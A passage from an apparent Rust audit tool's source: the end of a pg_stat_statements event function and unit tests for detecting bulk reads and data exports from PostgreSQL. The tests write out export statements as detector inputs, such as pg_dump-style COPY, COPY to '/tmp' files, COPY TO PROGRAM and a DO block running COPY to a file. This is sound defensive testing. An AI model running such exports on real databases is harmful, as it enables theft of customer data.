                .is_some_and(|s| s.len() >= DUMP_MIN_RELATIONS)
        {
            e = e.with_signal(Signal::PgDump);
        }
    } else if d.rows > LARGE_ROWS {
        e = e.with_signal(Signal::LargeResult);
    }
    // ADR-0049 decision 5: the connector's text query, exactly (`own_text`
    // also pins the agent's role, top level, the poller's database and the
    // `queryid`, `audit::pss`), reading nothing else.
    let own_text_query = d.own_text
        && text_read
        && !reads_star
        && !statistics
        && objects
            .iter()
            .all(|o| o.name == PSS_VIEW && o.schema.as_deref() == rule.pss_schema);
    let kind = if own_text_query {
        OwnKind::StatementText
    } else if statistics || text_read || reads_star {
        OwnKind::Never
    } else if objects.is_empty() && !named_any && d.own_text {
        OwnKind::Tableless
    } else if rw && objects.is_empty() {
        OwnKind::Unknown
    } else {
        OwnKind::Named
    };
    if own.routine(
        d.user,
        None,
        ClientSeen::NotVisible,
        &e,
        kind,
        Instant::now(),
    ) {
        return None;
    }
    Some(e)
}

/// Analysis of a `pg_stat_statements` text (`truncated`: the text reached
/// the read bound).
pub(crate) fn analyze_pss(text: &str, truncated: bool) -> QueryAnalysis {
    analyze(text, analyze_opts(truncated))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::audit::records::{Format, parse_record};

    /// No statement-text read (texts that name no listed entry).
    static NO_READS: TextReads = TextReads {
        objects: Vec::new(),
        star: false,
        named: Vec::new(),
        code: CodeUse::NotApplicable,
        routine_ddl: false,
        own_connector: false,
    };

    #[allow(clippy::too_many_arguments)]
    fn rec(
        session: &str,
        stmt: u64,
        sub: u64,
        class: &str,
        command: &str,
        object: &str,
        text: &str,
        rows: Option<u64>,
        app: &str,
    ) -> AuditRecord {
        let rows = rows.map_or(String::new(), |r| format!(",{r}"));
        let text = text.replace('"', "\"\"");
        let line = serde_json::json!({
            "timestamp": "2026-09-28 21:45:31.320 UTC", "user": user_of(app), "dbname": "shop",
            "error_severity": "LOG",
            "remote_host": "192.0.2.14", "session_id": session, "application_name": app,
            "message": format!("AUDIT: SESSION,{stmt},{sub},{class},{command},{},{object},\"{text}\",<not logged>{rows}",
                if object.is_empty() { "" } else { "TABLE" }),
        });
        parse_record(Format::Jsonlog, line.to_string().as_bytes(), "LOG").unwrap()
    }

    /// Records of the application `databastion-agent*` come from the
    /// agent's account `databastion`; others from `backup`.
    fn user_of(app: &str) -> &'static str {
        if app.starts_with("databastion-agent") || app == "stolen" {
            "databastion"
        } else {
            "backup"
        }
    }

    /// `shop` with `pg_stat_statements` in `public`.
    fn shop_catalogs(log_catalog: Option<bool>) -> Catalogs {
        let mut c = Catalogs::default();
        c.insert(
            "shop",
            DbCatalog {
                pss_schema: Some("public".to_owned()),
                pgaudit_log_catalog: log_catalog,
            },
        );
        c
    }
    use databastion_core::audit::own::SharedOwnUsage;

    fn own_shared(
        addr: Option<ClientAddr>,
        budget: u64,
        usage: SharedOwnUsage,
        statements: SharedOwnStatements,
    ) -> PgOwn {
        PgOwn::new(
            OwnAccount::new(
                "databastion",
                Some(crate::conn::APPLICATION_NAME),
                addr,
                budget,
                usage,
            ),
            statements,
        )
    }

    fn own_with(addr: Option<ClientAddr>, budget: u64, usage: SharedOwnUsage) -> PgOwn {
        own_shared(addr, budget, usage, SharedOwnStatements::default())
    }

    fn own() -> PgOwn {
        own_with(
            ClientAddr::parse("192.0.2.14"),
            1000,
            SharedOwnUsage::default(),
        )
    }

    fn json(e: &MaskedEvent) -> String {
        format!(
            "{:?} {:?} {:?} {:?}",
            e.action(),
            e.objects()
                .iter()
                .map(|o| format!(
                    "{}.{}.{}",
                    o.database().as_str(),
                    o.schema().map_or("", |s| s.as_str()),
                    o.object().as_str()
                ))
                .collect::<Vec<_>>(),
            e.rows(),
            e.signals().iter().map(|s| s.as_str()).collect::<Vec<_>>()
        )
    }

    #[test]
    fn pg_dump_copies_raise_signature_and_shape() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            rec(
                "s1",
                1,
                1,
                "READ",
                "SELECT",
                "",
                "SELECT c.oid FROM pg_catalog.pg_class c",
                Some(1),
                "pg_dump",
            ),
            rec(
                "s1",
                2,
                1,
                "READ",
                "COPY",
                "",
                "COPY crm.customers (id, email) TO stdout;",
                Some(0),
                "pg_dump",
            ),
            rec(
                "s1",
                3,
                1,
                "READ",
                "COPY",
                "",
                "COPY billing.invoices (id) TO stdout;",
                Some(0),
                "pg_dump",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        assert_eq!(events.len(), 2, "catalog-only statement skipped");
        let e = json(&events[0]);
        assert!(e.contains("shop.crm.customers"), "{e}");
        assert!(
            e.contains("signature.pg_dump") && e.contains("shape.full_table_copy"),
            "{e}"
        );
        assert_eq!(events[0].rows(), None, "utility COPY rows are unknown");
        assert_eq!(events[0].principal().application(), Some("pg_dump"));
    }

    #[test]
    fn dump_pattern_without_the_application_name() {
        let mut b = PgauditEvents::new(own());
        let recs: Vec<_> = ["a", "b", "c", "d"]
            .iter()
            .enumerate()
            .map(|(i, t)| {
                rec(
                    "s2",
                    i as u64 + 1,
                    1,
                    "READ",
                    "COPY",
                    "",
                    &format!("copy crm.{t} to stdout"),
                    Some(0),
                    "psql",
                )
            })
            .collect();
        let events = b.convert(recs, SystemTime::now());
        let dump: Vec<bool> = events
            .iter()
            .map(|e| e.signals().contains(&Signal::PgDump))
            .collect();
        assert_eq!(dump, [false, false, true, true]);
    }

    #[test]
    fn session_and_object_records_merge_and_rows_are_kept() {
        let mut b = PgauditEvents::new(own());
        let text = "select * from crm.customers";
        let mut object = rec(
            "s3",
            1,
            1,
            "READ",
            "SELECT",
            "crm.customers",
            text,
            Some(20000),
            "psql",
        );
        object.audit.object_audit = true;
        let session = rec(
            "s3",
            1,
            1,
            "READ",
            "SELECT",
            "crm.customers",
            text,
            Some(20000),
            "psql",
        );
        let events = b.convert(vec![object, session], SystemTime::now());
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].rows(), Some(20000));
        let e = json(&events[0]);
        assert!(
            e.contains("shape.full_table_read") && e.contains("volume.large_result"),
            "{e}"
        );
        assert!(!e.contains("pg_dump"));
    }

    #[test]
    fn copy_to_file_and_program_and_filtered_reads() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            rec(
                "s4",
                1,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "copy (select id from crm.customers) to '/tmp/x.csv'",
                Some(150),
                "psql",
            ),
            rec(
                "s4",
                1,
                2,
                "READ",
                "COPY",
                "",
                "copy (select id from crm.customers) to '/tmp/x.csv'",
                Some(0),
                "psql",
            ),
            rec(
                "s4",
                2,
                1,
                "READ",
                "COPY",
                "",
                "copy crm.customers to program 'gzip'",
                Some(0),
                "psql",
            ),
            rec(
                "s4",
                3,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "select * from crm.customers where id = 42",
                Some(1),
                "psql",
            ),
            rec(
                "s4",
                4,
                1,
                "WRITE",
                "INSERT",
                "crm.notes",
                "insert into crm.notes select * from crm.customers",
                Some(3),
                "psql",
            ),
            rec(
                "s4",
                4,
                1,
                "READ",
                "SELECT",
                "crm.customers",
                "insert into crm.notes select * from crm.customers",
                Some(3),
                "psql",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(all.len(), 5, "{all:?}");
        assert!(
            all[0].contains("signature.copy_to_file") && all[0].contains("shape.full_table_copy"),
            "{}",
            all[0]
        );
        assert_eq!(events[0].rows(), Some(150));
        assert!(all[1].contains("signature.copy_to_program"), "{}", all[1]);
        assert!(!all[2].contains("shape."), "{}", all[2]);
        assert!(
            all[3].starts_with("Read") && all[3].contains("crm.customers"),
            "{}",
            all[3]
        );
        assert!(
            all[4].starts_with("Write") && all[4].contains("crm.notes"),
            "{}",
            all[4]
        );
    }

    #[test]
    fn own_writes_ddl_and_dcl_are_always_reported() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            rec(
                "b1",
                1,
                1,
                "WRITE",
                "UPDATE",
                "crm.t",
                "UPDATE crm.t SET a = $1 WHERE id = $2",
                Some(1),
                "databastion-agent",
            ),
            rec(
                "b1",
                2,
                1,
                "DDL",
                "ALTER TABLE",
                "crm.t",
                "ALTER TABLE crm.t ADD COLUMN b int",
                None,
                "databastion-agent",
            ),
            rec(
                "b1",
                3,
                1,
                "ROLE",
                "GRANT",
                "",
                "GRANT SELECT ON crm.t TO x",
                None,
                "databastion-agent",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 3, "{all:?}");
    }

    #[test]
    fn own_account_is_reported_unless_routine() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![
            // The agent's Discovery sample: skipped.
            rec(
                "a1",
                1,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
                Some(1000),
                "databastion-agent",
            ),
            // Same account, whole-table read: reported even under the agent's name.
            rec(
                "a1",
                2,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "select * from crm.t",
                Some(5),
                "databastion-agent",
            ),
            // Same account from another application: reported.
            rec(
                "a2",
                1,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "select a from crm.t where id = 1",
                Some(1),
                "stolen",
            ),
        ];
        let events = b.convert(recs, SystemTime::now());
        let all: Vec<String> = events.iter().map(json).collect();
        assert_eq!(events.len(), 2, "{all:?}");
        assert!(all[0].contains("shape.full_table_read"), "{all:?}");
        assert_eq!(events[1].principal().application(), Some("stolen"));
        // pg_stat_statements: the agent's account only with a signal.
        let routine = analyze_pss("SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1", false);
        let dump = analyze_pss("select * from crm.t", false);
        let deltas = [
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "databastion",
                database: "shop",
                analysis: &routine,
                calls: 1,
                rows: 1000,
            },
            StatementDelta {
                reads: &NO_READS,
                own_text: false,
                user: "databastion",
                database: "shop",
                analysis: &dump,
                calls: 1,
                rows: 5,
            },
        ];
        let t0 = SystemTime::UNIX_EPOCH;
        let ev = pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t0);
        assert_eq!(ev.len(), 1);
        assert!(ev[0].signals().contains(&Signal::FullTableRead));
    }

    #[test]
    fn own_account_paging_and_other_addresses_are_reported() {
        let page = |i: u64| {
            rec(
                "p1",
                i,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
                Some(600),
                "databastion-agent",
            )
        };
        let mut b = PgauditEvents::new(own());
        // 600 rows: within Discovery's budget (1000); 1200: beyond.
        assert!(b.convert(vec![page(1)], SystemTime::now()).is_empty());
        assert_eq!(b.convert(vec![page(2)], SystemTime::now()).len(), 1);
        // Another client address than the agent's.
        let mut b = PgauditEvents::new(own_with(
            ClientAddr::parse("198.51.100.7"),
            1000,
            SharedOwnUsage::default(),
        ));
        assert_eq!(b.convert(vec![page(1)], SystemTime::now()).len(), 1);
        // The agent's address could not be read: nothing is left out.
        let mut b = PgauditEvents::new(own_with(None, 1000, SharedOwnUsage::default()));
        assert_eq!(b.convert(vec![page(1)], SystemTime::now()).len(), 1);
        // Unknown rows (pgaudit.log_rows off) are charged the whole budget:
        // the second statement on the same object is reported.
        let unknown = |i: u64| {
            rec(
                "p2",
                i,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
                None,
                "databastion-agent",
            )
        };
        let mut b = PgauditEvents::new(own());
        assert!(b.convert(vec![unknown(1)], SystemTime::now()).is_empty());
        assert_eq!(b.convert(vec![unknown(2)], SystemTime::now()).len(), 1);
        // pg_stat_statements: rows per object within the poll.
        let routine = analyze_pss("SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1", false);
        let deltas = [StatementDelta {
            reads: &NO_READS,
            own_text: false,
            user: "databastion",
            database: "shop",
            analysis: &routine,
            calls: 3,
            rows: 3000,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        assert_eq!(
            pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t0).len(),
            1
        );
    }

    #[test]
    fn own_budget_survives_stream_restarts_and_source_switches() {
        let shared = SharedOwnUsage::default();
        let own_on = |u: &SharedOwnUsage| {
            own_with(
                ClientAddr::parse("192.0.2.14"),
                1000,
                std::sync::Arc::clone(u),
            )
        };
        let page = rec(
            "r1",
            1,
            1,
            "READ",
            "SELECT",
            "crm.t",
            "SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1",
            Some(600),
            "databastion-agent",
        );
        // First pgaudit stream: within the budget.
        let mut b = PgauditEvents::new(own_on(&shared));
        assert!(b.convert(vec![page], SystemTime::now()).is_empty());
        drop(b);
        // The stream restarts on pg_stat_statements (source switch): the
        // same object is still charged, and the next read is reported.
        let routine = analyze_pss("SELECT \"a\" FROM ONLY \"crm\".\"t\" LIMIT $1", false);
        let deltas = [StatementDelta {
            reads: &NO_READS,
            own_text: false,
            user: "databastion",
            database: "shop",
            analysis: &routine,
            calls: 1,
            rows: 600,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        assert_eq!(
            pss_events(&deltas, &mut own_on(&shared), &Catalogs::default(), t0, t0).len(),
            1
        );
        // A fresh usage (what a per-stream counter did) would have skipped it.
        assert!(
            pss_events(
                &deltas,
                &mut own_on(&SharedOwnUsage::default()),
                &Catalogs::default(),
                t0,
                t0
            )
            .is_empty()
        );
    }

    /// A read of the agent's identity that returns no row is charged one
    /// row (security review of #196, Low), on pgaudit (with
    /// `pgaudit.log_rows`) per statement, and on `pg_stat_statements` per
    /// call of a delta: a walk of 0-row reads is left out for at most the
    /// per-object budget of statements, then reported.
    #[test]
    fn own_zero_row_reads_are_charged_one_row_each() {
        let walk = |n: u64| {
            rec(
                "w1",
                n,
                1,
                "READ",
                "SELECT",
                "crm.t",
                "SELECT 1 FROM crm.t WHERE id = $1 AND email = $2",
                Some(0),
                "databastion-agent",
            )
        };
        let mut b = PgauditEvents::new(own_with(
            ClientAddr::parse("192.0.2.14"),
            3,
            SharedOwnUsage::default(),
        ));
        let reported: Vec<usize> = (1..=5)
            .map(|n| b.convert(vec![walk(n)], SystemTime::now()).len())
            .collect();
        assert_eq!(reported, [0, 0, 0, 1, 1]);
        // pg_stat_statements: one delta of 3 calls uses up a budget of 3,
        // one of 4 calls is over it.
        let routine = analyze_pss("SELECT 1 FROM crm.t WHERE id = $1 AND email = $2", false);
        let delta = |calls| StatementDelta {
            reads: &NO_READS,
            own_text: false,
            user: "databastion",
            database: "shop",
            analysis: &routine,
            calls,
            rows: 0,
        };
        let t0 = SystemTime::UNIX_EPOCH;
        let own3 = || {
            own_with(
                ClientAddr::parse("192.0.2.14"),
                3,
                SharedOwnUsage::default(),
            )
        };
        let mut own = own3();
        let cats = Catalogs::default();
        assert!(pss_events(&[delta(3)], &mut own, &cats, t0, t0).is_empty());
        assert_eq!(pss_events(&[delta(1)], &mut own, &cats, t0, t0).len(), 1);
        assert_eq!(pss_events(&[delta(4)], &mut own3(), &cats, t0, t0).len(), 1);
    }

    /// Quoted identifiers that differ only in case share one budget
    /// (security review of #197, M2): fails closed, `"T"` and `t` are
    /// charged together.
    #[test]
    fn own_budget_ignores_the_case_of_names() {
        let read = |n: u64, object: &str, text: &str| {
            rec(
                "c1",
                n,
                1,
                "READ",
                "SELECT",
                object,
                text,
                Some(0),
                "databastion-agent",
            )
        };
        let mut b = PgauditEvents::new(own_with(
            ClientAddr::parse("192.0.2.14"),
            2,
            SharedOwnUsage::default(),
        ));
        let reported: Vec<usize> = [
            read(1, "crm.t", "SELECT 1 FROM crm.t WHERE id = $1"),
            read(2, "crm.T", "SELECT 1 FROM crm.\"T\" WHERE id = $1"),
            read(3, "CRM.t", "SELECT 1 FROM \"CRM\".t WHERE id = $1"),
        ]
        .into_iter()
        .map(|r| b.convert(vec![r], SystemTime::now()).len())
        .collect();
        assert_eq!(reported, [0, 0, 1]);
    }

    /// The per-transaction statements of one Discovery scan (about 90
    /// transactions) and the check / stream probes, as the agent sends
    /// them.
    fn own_tableless_records(app: &str, n: u64) -> Vec<AuditRecord> {
        let mut out = vec![rec(
            "own1",
            1,
            1,
            "READ",
            "SELECT",
            "",
            sql::SESSION_SETUP,
            Some(1),
            app,
        )];
        for i in 0..n {
            out.push(rec(
                "own1",
                2 + i,
                1,
                "READ",
                "SELECT",
                "",
                sql::SET_LOCAL_TIMEOUTS,
                Some(1),
                app,
            ));
        }
        out.push(rec(
            "own1",
            2 + n,
            1,
            "READ",
            "SELECT",
            "",
            sql::OWN_CLIENT_ADDR,
            Some(1),
            app,
        ));
        out
    }

    fn charged_keys(u: &SharedOwnUsage) -> Vec<String> {
        u.lock().unwrap().budgeted_objects()
    }

    #[test]
    fn own_tableless_statements_are_skipped_and_not_charged() {
        let usage = SharedOwnUsage::default();
        // A small budget: one charge of the old rule would exceed it.
        let acct = own_with(
            ClientAddr::parse("192.0.2.14"),
            10,
            std::sync::Arc::clone(&usage),
        );
        let mut b = PgauditEvents::new(acct);
        // pgaudit.log_rows off: unknown rows, charged the whole budget
        // under the row rule.
        let mut recs = own_tableless_records("databastion-agent", 5);
        for r in &mut recs {
            r.audit.rows = None;
        }
        recs.extend(own_tableless_records("databastion-agent", 5));
        let events = b.convert(recs, SystemTime::now());
        assert!(
            events.is_empty(),
            "{:?}",
            events.iter().map(json).collect::<Vec<_>>()
        );
        assert!(
            charged_keys(&usage).is_empty(),
            "{:?}",
            charged_keys(&usage)
        );
        // The same statements from the agent's account under another
        // application, and from another role: reported against `*`.
        for app in ["stolen", "psql"] {
            let mut b = PgauditEvents::new(own());
            let events = b.convert(own_tableless_records(app, 2), SystemTime::now());
            assert_eq!(events.len(), 4, "{app}");
            assert!(events.iter().all(|e| json(e).contains("shop..*")), "{app}");
        }
        // The agent's application and account from another address.
        let mut b = PgauditEvents::new(own_with(
            ClientAddr::parse("198.51.100.7"),
            1000,
            SharedOwnUsage::default(),
        ));
        let events = b.convert(
            own_tableless_records("databastion-agent", 1),
            SystemTime::now(),
        );
        assert_eq!(events.len(), 3);
    }

    #[test]
    fn own_account_other_tableless_statements_are_reported() {
        let usage = SharedOwnUsage::default();
        let mut b = PgauditEvents::new(own_with(
            ClientAddr::parse("192.0.2.14"),
            1000,
            std::sync::Arc::clone(&usage),
        ));
        let texts = [
            // A user-defined function: the connector never calls one.
            "select crm.f()",
            "SELECT crm.f($1)",
            // pg_catalog functions that read relations or run SQL.
            "SELECT pg_catalog.query_to_xml($1, true, false, '')",
            "select pg_catalog.lo_get(16400)",
            // An own statement with something appended or changed.
            &format!("{} , crm.f()", sql::OWN_CLIENT_ADDR),
            "SELECT pg_catalog.set_config('statement_timeout', $1, true)",
            &sql::SET_LOCAL_TIMEOUTS.to_lowercase(),
            // Another setting read, or the own statement with constants
            // instead of its bound parameters: exact text only.
            &sql::SESSION_SETUP.replace("server_version_num", "crm.secret"),
            &sql::SET_LOCAL_TIMEOUTS.replace("$1", "'1s'"),
            // Several statements.
            &format!("{}; select crm.f()", sql::OWN_CLIENT_ADDR),
        ];
        for (i, t) in texts.iter().enumerate() {
            let r = rec(
                "f1",
                i as u64 + 1,
                1,
                "READ",
                "SELECT",
                "",
                t,
                Some(1),
                "databastion-agent",
            );
            let events = b.convert(vec![r], SystemTime::now());
            assert_eq!(events.len(), 1, "{t}");
            assert!(json(&events[0]).contains("shop..*"), "{t}");
        }
        assert!(charged_keys(&usage).is_empty(), "`*` is never budgeted");
        // One record of the statement is an own text, another is not: the
        // event is not an own statement.
        let recs = vec![
            rec(
                "f2",
                1,
                1,
                "READ",
                "SELECT",
                "",
                sql::OWN_CLIENT_ADDR,
                Some(1),
                "databastion-agent",
            ),
            rec(
                "f2",
                1,
                2,
                "READ",
                "SELECT",
                "",
                "select crm.f()",
                Some(1),
                "databastion-agent",
            ),
        ];
        assert_eq!(b.convert(recs, SystemTime::now()).len(), 1);
    }

    #[test]
    fn own_reads_of_a_masked_name_stay_budgeted() {
        // A value-like relation name normalizes to `*`: still a named
        // relation, budgeted like any other (not the unknown object).
        let text = "SELECT \"a\" FROM ONLY \"crm\".\"export_client_0639988384\" LIMIT $1";
        let r = rec(
            "v1",
            1,
            1,
            "READ",
            "SELECT",
            "crm.export_client_0639988384",
            text,
            Some(10),
            "databastion-agent",
        );
        let mut b = PgauditEvents::new(own());
        assert!(b.convert(vec![r], SystemTime::now()).is_empty());
        let a = analyze_pss(text, false);
        let deltas = [StatementDelta {
            reads: &NO_READS,
            own_text: false,
            user: "databastion",
            database: "shop",
            analysis: &a,
            calls: 1,
            rows: 10,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        assert!(pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t0).is_empty());
    }

    #[test]
    fn own_tableless_statements_with_a_signal_are_reported() {
        let mut b = PgauditEvents::new(own());
        let r = rec(
            "g1",
            1,
            1,
            "READ",
            "SELECT",
            "",
            sql::SET_LOCAL_TIMEOUTS,
            Some(LARGE_ROWS + 1),
            "databastion-agent",
        );
        let events = b.convert(vec![r], SystemTime::now());
        assert_eq!(events.len(), 1);
        assert!(events[0].signals().contains(&Signal::LargeResult));
        // pg_stat_statements: rows summed over the poll.
        let a = analyze_pss(PSS_SET_LOCAL, false);
        let deltas = [StatementDelta {
            reads: &NO_READS,
            own_text: true,
            user: "databastion",
            database: "shop",
            analysis: &a,
            calls: LARGE_ROWS + 1,
            rows: LARGE_ROWS + 1,
        }];
        let t0 = SystemTime::UNIX_EPOCH;
        let ev = pss_events(&deltas, &mut own(), &Catalogs::default(), t0, t0);
        assert_eq!(ev.len(), 1);
        assert!(ev[0].signals().contains(&Signal::LargeResult));
    }

    /// `SET_LOCAL_TIMEOUTS` as `pg_stat_statements` stores it (constants,
    /// booleans included, replaced by parameters numbered after the bound
    /// ones; checked on PostgreSQL 16).
    const PSS_SET_LOCAL: &str = "SELECT pg_catalog.set_config($4, $1, $5), \
        pg_catalog.set_config($6, $2, $7), pg_catalog.set_config($8, $3, $9), \
        pg_catalog.current_setting($10)";

    #[test]
    fn pss_form_of_the_own_statements() {
        assert_eq!(
            pss_form(sql::SET_LOCAL_TIMEOUTS).as_deref(),
            Some(PSS_SET_LOCAL)
        );
        assert_eq!(
            pss_form(sql::SESSION_SETUP).as_deref(),
            Some(
                "SELECT pg_catalog.set_config($4, $5, $6), \
                 pg_catalog.set_config($7, $8, $9), \
                 pg_catalog.set_config($10, $1, $11), \
                 pg_catalog.set_config($12, $2, $13), \
                 pg_catalog.set_config($14, $3, $15), \
                 pg_catalog.current_setting($16)"
            )
        );
        assert_eq!(
            pss_form(sql::OWN_CLIENT_ADDR).as_deref(),
            Some(sql::OWN_CLIENT_ADDR)
        );
        let texts = pss_form(&sql::pss_texts("public", true).unwrap()).unwrap();
        // Numbered in order of appearance, as PostgreSQL does.
        assert!(texts.contains("left(s.query, $2)"), "{texts}");
        assert!(texts.contains("OPERATOR(pg_catalog.>=) $3"), "{texts}");
        assert!(texts.contains("pg_stat_statements($4)"), "{texts}");
        assert!(texts.ends_with("LIMIT $5"), "{texts}");
        assert!(texts.contains("ANY($1)"), "{texts}");
        let texts = pss_form(&sql::pss_texts("public", false).unwrap()).unwrap();
        assert!(texts.contains("s.queryid, $2, pg_catalog"), "{texts}");
        // Quoted identifiers and doubled quotes.
        assert_eq!(
            pss_form("SELECT \"a\"\"b\" FROM t WHERE x = 'it''s' AND y = $1").as_deref(),
            Some("SELECT \"a\"\"b\" FROM t WHERE x = $2 AND y = $1")
        );
        // What the connector never sends: no form, never matched.
        for t in [
            "SELECT 1 -- c",
            "SELECT /* c */ 1",
            "SELECT E'a'",
            "SELECT 1.5",
            "SELECT $$a$$",
            "SELECT 'a",
            "SELECT é",
        ] {
            assert_eq!(pss_form(t), None, "{t}");
        }
    }

    #[test]
    fn own_tableless_statements_in_pg_stat_statements() {
        let setup = pss_form(sql::SESSION_SETUP).unwrap();
        let texts_sql = sql::pss_texts("public", true).unwrap();
        let texts = pss_form(&texts_sql).unwrap();
        let own_account = own;
        let usage = SharedOwnUsage::default();
        let mut own = own_with(
            ClientAddr::parse("192.0.2.14"),
            10,
            std::sync::Arc::clone(&usage),
        );
        own.allow_text_query(&texts_sql);
        for t in [PSS_SET_LOCAL, &setup, sql::OWN_CLIENT_ADDR, &texts] {
            assert!(own.own_pss_text(t), "{t}");
        }
        // Sent with constants instead of the connector's bound
        // parameters (another queryid), another setting read, another
        // spelling, the text as sent: not an own statement (#76 review I2).
        let literals = "SELECT pg_catalog.set_config($1, $2, $3), \
            pg_catalog.set_config($4, $5, $6), pg_catalog.set_config($7, $8, $9), \
            pg_catalog.current_setting($10)";
        let lowered = PSS_SET_LOCAL.to_lowercase();
        let reordered = "SELECT pg_catalog.set_config($4, $1, $5), \
            pg_catalog.set_config($6, $2, $7), pg_catalog.set_config($8, $3, $9), \
            pg_catalog.current_setting($1)";
        for t in [
            literals,
            &lowered,
            reordered,
            sql::SET_LOCAL_TIMEOUTS,
            "select crm.f($1)",
        ] {
            assert!(!own.own_pss_text(t), "{t}");
        }
        let catalogs = shop_catalogs(None);
        let none = HashSet::new();
        let rule = catalogs.rule("shop", true, &none);
        let analyzed = |t: &str| {
            let a = analyze_pss(t, false);
            let reads = text_reads(t, &a, rule, false);
            (a, own.own_pss_text(t), reads)
        };
        let set_local = analyzed(PSS_SET_LOCAL);
        let setup = analyzed(&setup);
        let addr = analyzed(sql::OWN_CLIENT_ADDR);
        let texts = analyzed(&texts);
        let literals = analyzed(literals);
        let other = analyzed("select crm.f($1)");
        // A cut text is never an own statement (the poller checks `cut`).
        let cut = (
            analyze_pss(sql::OWN_CLIENT_ADDR, true),
            false,
            TextReads::default(),
        );
        fn delta<'a>(user: &'a str, a: &'a (QueryAnalysis, bool, TextReads)) -> StatementDelta<'a> {
            StatementDelta {
                reads: &a.2,
                user,
                database: "shop",
                analysis: &a.0,
                own_text: a.1,
                calls: 90,
                rows: 90,
            }
        }
        let t0 = SystemTime::UNIX_EPOCH;
        // Two polls' worth of a scan: nothing reported, nothing charged.
        for _ in 0..2 {
            let deltas = [
                delta("databastion", &set_local),
                delta("databastion", &setup),
                delta("databastion", &addr),
                delta("databastion", &texts),
            ];
            let ev = pss_events(&deltas, &mut own, &catalogs, t0, t0);
            assert!(
                ev.is_empty(),
                "{:?}",
                ev.iter().map(json).collect::<Vec<_>>()
            );
        }
        assert!(charged_keys(&usage).is_empty());
        // Another role, a cut text, another function, the own statement
        // with constants instead of parameters: reported on `*`; the text
        // query from another role: a read of the statement texts
        // (ADR-0049).
        let deltas = [
            delta("app", &set_local),
            delta("databastion", &cut),
            delta("databastion", &other),
            delta("databastion", &literals),
        ];
        let ev = pss_events(&deltas, &mut own, &catalogs, t0, t0);
        assert_eq!(ev.len(), 4);
        assert!(ev.iter().all(|e| json(e).contains("shop..*")));
        let ev = pss_events(&[delta("app", &texts)], &mut own, &catalogs, t0, t0);
        assert_eq!(objects_of(&ev[0]), ["shop.public.pg_stat_statements"]);
        assert!(ev[0].always_report());
        assert!(charged_keys(&usage).is_empty(), "never budgeted");
        // Without the stream's registration, the text query is not one of
        // the agent's statements.
        let fresh = own_account();
        assert!(!fresh.own_pss_text(&pss_form(&texts_sql).unwrap()));
    }

    #[test]
    fn a_discovery_scan_leaves_no_own_event_and_no_wildcard_charge() {
        // Every statement the connector sends, as pgaudit logs it
        // (`pgaudit.log_rows` on, `log_relation` off), with about 90
        // transactions of `set_config` calls; the sampling statements
        // within the budget. The `pg_stat_statements` text queries were
        // registered by an earlier `pg_stat_statements` stream of the
        // target (source switch: the pgaudit stream reads the records of
        // that period).
        let usage = SharedOwnUsage::default();
        let statements = SharedOwnStatements::default();
        let mut pss = own_shared(
            ClientAddr::parse("192.0.2.14"),
            1000,
            std::sync::Arc::clone(&usage),
            std::sync::Arc::clone(&statements),
        );
        pss.allow_text_query(&sql::pss_texts("public", true).unwrap());
        pss.allow_text_query(&sql::pss_texts("public", false).unwrap());
        drop(pss);
        // ADR-0049 decision 5: the records fall within that stream's
        // period.
        let periods = SharedPssPeriods::default();
        periods.lock().unwrap().start(SystemTime::UNIX_EPOCH);
        let mut b = PgauditEvents::new(
            own_shared(
                ClientAddr::parse("192.0.2.14"),
                1000,
                std::sync::Arc::clone(&usage),
                statements,
            )
            .with_periods(periods),
        );
        b.set_catalogs(shop_catalogs(Some(false)));
        let mut recs = own_tableless_records("databastion-agent", 90);
        for (i, text) in sql::all_statements().iter().enumerate() {
            // Transaction control is logged in the MISC class.
            let (class, command) = match text.split(' ').next() {
                Some("BEGIN") => ("MISC", "BEGIN"),
                Some("COMMIT") => ("MISC", "COMMIT"),
                Some("ROLLBACK") => ("MISC", "ROLLBACK"),
                _ => ("READ", "SELECT"),
            };
            recs.push(rec(
                "scan",
                i as u64 + 1,
                1,
                class,
                command,
                "",
                text,
                Some(100),
                "databastion-agent",
            ));
        }
        let events = b.convert(recs, SystemTime::now());
        assert!(
            events.is_empty(),
            "{:?}",
            events.iter().map(json).collect::<Vec<_>>()
        );
        let keys = charged_keys(&usage);
        assert!(!keys.iter().any(|k| k.ends_with("\u{0}*")), "{keys:?}");
        // Only the sampled relation (`s.t`) is budgeted.
        assert_eq!(keys, ["shop\u{0}s\u{0}t"], "{keys:?}");
    }

    #[test]
    fn copy_records_not_settled_by_their_text_are_server_side_exports() {
        let mut b = PgauditEvents::new(own());
        let recs = vec![rec(
            "x1",
            1,
            2,
            "READ",
            "COPY",
            "",
            "DO $$ BEGIN EXECUTE format('COPY %I.%I TO %L', 'crm', 'customers', '/tmp/x'); END $$",
            Some(0),
            "psql",
        )];
